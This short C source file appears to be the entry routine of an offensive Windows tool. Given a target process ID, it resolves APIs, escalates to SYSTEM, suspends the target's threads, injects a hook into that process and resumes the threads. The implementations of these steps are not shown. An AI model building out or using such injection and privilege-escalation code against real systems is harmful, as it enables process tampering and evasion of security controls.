#include "common.h"

#include "injection.h"
#include "token.h"
#include "threads.h"

DWORD go(DWORD dwPid){

	BOOL bSuccess = FALSE;
	API api = { 0 };

	bSuccess = ResolveApi(&api);
	if (bSuccess == FALSE)
		goto exit;

	bSuccess = GetSystem(&api);
	if (bSuccess == FALSE)
		goto exit;

	bSuccess = SuspendResumeThreads(&api, dwPid);
	if (bSuccess == FALSE)
		goto exit;

	bSuccess = InjectHook(&api, dwPid);
	if (bSuccess == FALSE)
		goto exit;

	bSuccess = SuspendResumeThreads(&api, dwPid);
	if (bSuccess == FALSE)
		goto exit;

	bSuccess = TRUE;

exit:

	return bSuccess;

}